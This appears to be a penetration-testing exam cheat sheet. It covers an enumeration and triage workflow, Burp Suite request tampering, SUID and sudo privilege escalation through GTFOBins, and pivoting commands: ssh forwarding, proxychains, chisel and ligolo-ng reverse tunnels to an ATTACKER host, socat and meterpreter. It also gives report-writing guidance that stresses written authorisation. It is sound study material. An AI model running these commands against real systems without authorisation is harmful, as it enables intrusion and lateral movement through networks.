Exam Strategy & Workflow

▼

The loop mindset

  • Enumerate → foothold → stabilize → loot → privesc → repeat. Re-enumerate after every new access level.
  • Full port scan first. Bugs live on the weird, high, forgotten ports — never scan only the top 1000.
  • Note the version of every service → search it for a public exploit / CVE.
  • Always try default & weak creds (admin:admin, root:root) before brute-forcing.
  • Don't rabbit-hole. Stuck 20–30 min? Move to the next port/service and come back.
  • Screenshot + log every command as you go — you need it for the report and to backtrack.

Fast triage order order

  • 1. nmap -sC -sV -p- → catalogue ports
  • 2. Web (80/443/8080…) → dirbust + view source + default creds
  • 3. SMB (445) → enum4linux, null session, shares
  • 4. FTP (21) → anonymous login
  • 5. Any login → hydra with a small list
  • 6. Foothold → linpeas/winPEAS + sudo -l / whoami /priv

Burp Suite

▼

Core tools workflow

  • Proxy — intercept browser↔server (127.0.0.1:8080 + FoxyProxy)
  • Repeater (Ctrl+R) — send & tweak single requests manually
  • Intruder — fuzz a position (Sniper) across a wordlist
  • Decoder — URL / base64 / hex encode-decode
  • Comparer — diff two responses (blind SQLi/auth)

Exam moves tamper

  • Right-click request → Send to Repeater, then edit params/headers/JSON body
  • Flip role=user→admin, verified=false→true
  • Change object IDs to test IDOR; strip cookies to test auth
  • Turn Intercept off to browse, on to catch a specific request
  • Proxy → HTTP history to map the app's API calls

Common wins escalate

  • sudo entry → check GTFOBins for the binary
  • SUID binary → GTFOBins -p / SUID method

From sudo -l or find / -perm -4000: match the binary below, or look it up at gtfobins.github.io. -p on a SUID binary preserves root's euid. Overwrite-passwd hash = openssl passwd 'pass'.

Pivoting & Tunneling

▼

SSH port forwarding ssh

local (-L) → reach a service behind the pivot
ssh -L 8080:10.10.20.5:80 user@PIVOT
remote (-R) → expose an internal host back to you
ssh -R 3389:10.10.20.5:3389 user@ATTACKER
dynamic (-D) → SOCKS proxy over ssh
ssh -fN -D 1080 user@PIVOT

-fN = background, no shell. Pair -D with proxychains.

proxychains + SOCKS route

echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf proxychains nmap -sT -Pn 10.10.20.5 proxychains nxc smb 10.10.20.0/24 proxychains evil-winrm -i 10.10.20.5 -u u -p p

Use -sT (full connect) through a proxy — SYN/UDP scans won't traverse it.

chisel http tunnel

attacker (server)
./chisel server -p 8000 --reverse
victim → reverse SOCKS (then proxychains :1080)
./chisel client ATTACKER:8000 R:socks
reverse-forward a single host
./chisel client ATTACKER:8000 R:3389:10.10.20.5:3389

Tunnels over HTTP → firewall-friendly when only 80/443 is out.

ligolo-ng tun

attacker — set up interface + proxy
sudo ip tuntap add user $USER mode tun ligolo sudo ip link set ligolo up ./proxy -selfcert
victim agent → then in ligolo: session
./agent -connect ATTACKER:11601 sudo ip route add 10.10.20.0/24 dev ligolo # then: start

Whole-subnet routing via a tun iface — no proxychains needed, tools work natively.

sshuttle · socat · meterpreter misc

sshuttle -r user@PIVOT 10.10.20.0/24 # VPN-like, no proxychains socat TCP-LISTEN:8080,fork TCP:10.10.20.5:80 # simple relay plink.exe -R 3389:127.0.0.1:3389 u@ATTACKER # windows -R run autoroute -s 10.10.20.0/24 # meterpreter portfwd add -l 3389 -p 3389 -r 10.10.20.5

Methodology & Reporting

▼

Report structure deliver

  • Summary (business + security) — write it last
  • Vulnerability write-ups (technical, 70–90%): Title · Risk (CVSS) · Summary · Background · Evidence · Impact · Remediation (root cause) · Refs
  • Appendices — scope coverage · artefacts left behind (for blue team cleanup)
  • Rate each finding in isolation; remediation fixes the root cause (SQLi → parameterisation)

Style & re-testing quality

  • Past tense · no first-person · objective · mask secrets · peer QA
  • Re-test = findings only; reassessment = full surface (needs new SOW)
  • Outcomes: Pass / Fail / Partial / Risk-Accepted
  • Test variant payloads, not just the original PoC — blocked string ≠ fixed root cause
  • New surface found → separate memo, don't test without written auth
